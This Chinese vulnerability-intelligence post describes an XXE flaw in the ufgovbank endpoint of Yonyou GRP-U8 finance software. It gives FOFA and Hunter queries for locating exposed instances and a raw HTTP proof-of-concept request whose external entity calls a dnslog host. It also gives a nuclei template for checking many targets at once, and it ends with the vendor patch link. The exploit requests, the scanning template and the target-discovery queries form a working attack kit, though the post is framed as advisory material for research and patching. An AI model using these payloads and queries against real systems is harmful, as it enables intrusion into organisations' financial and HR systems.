#  【漏洞情报 | 新】用友GRP-U8 ufgovbank XXE漏洞   
原创 4Zen  划水但不摆烂   2024-01-14 19:02  
  
## 免责声明  
  
文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
## 产品简介  
  
用友GRP-U8是一款企业级的综合管理软件，主要用于财务、人力资源、供应链、生产制造等多个领域的管理与协同。它具备强大的功能模块，包括财务核算、费用管理、人力资源管理、采购管理、销售管理、库存管理等，能够满足企业不同部门和业务流程的需求。用友GRP-U8以其稳定性和灵活性著称，适用于中小型企业和大型企业的管理需求。![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagyReMVa4A2hRT6llbI9ExGrQ1MnUBdAYcCUBJ3nqqoLnPNzbqj4hKfMMYxbA0PPRUib3OU9HWdIVibg/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞描述  
  
用友GRP-U8的ufgovbank接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。  
## 影响版本  
```
用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，
产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。

```  
## 网络测绘  
  
favicon图标特征  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagyReMVa4A2hRT6llbI9ExGrw10nsibIQYmcWSsoO4QkPMAC2rDxQj8mmGU1OM6nT7ViaYOvkRibcFaYA/640?wx_fmt=png&from=appmsg "")  
  
FOFA网络测绘搜索  
```
app="用友-GRP-U8"

```  
  
鹰图网络测绘搜索  
```
app.name="用友GRP-U8 OA"

```  
## 漏洞复现  
  
准备一个dnslog平台用于回显
http://dnslog.cn/  
  
POC：  
```
POST /ufgovbank HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Connection: close
Content-Length: 153
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

reqData=<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://dnslog地址">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest

```  
  
发送POC请求包如下图所示![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagyReMVa4A2hRT6llbI9ExGrOgc1URjOq9SDKUtcia7IKwYUhMXvNqsicRjxalaJb33rPnEZ0yWqH3Rw/640?wx_fmt=png&from=appmsg "")  
  
  
然后去dnslog看结果了![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagyReMVa4A2hRT6llbI9ExGrZSmU8By9LsOHlvIQV1aDqiaOZwl1cjybeXPLtunicEK28HYOEM8txtmQ/640?wx_fmt=png&from=appmsg "")  
  
  
nuclei批量验证POC模板  
```
id: YonYou-GRP-U8-ufgovbank-XXE

info:
  name: 用友GRP-U8 ufgovbank XXE漏洞
  author: 4Zen
  severity: high

requests:
  - raw:
      - |
        POST /ufgovbank HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Type: application/x-www-form-urlencoded
        
        reqData=<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagyReMVa4A2hRT6llbI9ExGrqtd2Gwsvh8uuyZVaenlKGibnLRMFukna8svT6yo385VSV7ouEibj6o3g/640?wx_fmt=png&from=appmsg "")  
## 修复方案  
  
用友安全中心在2024年1月2日已发布相关补丁，请及时更新修复补丁。  
```
https://security.yonyou.com/#/patchInfo?identifier=f234175cba534454adbe1caf9dc2fc88

```  
  
  
  
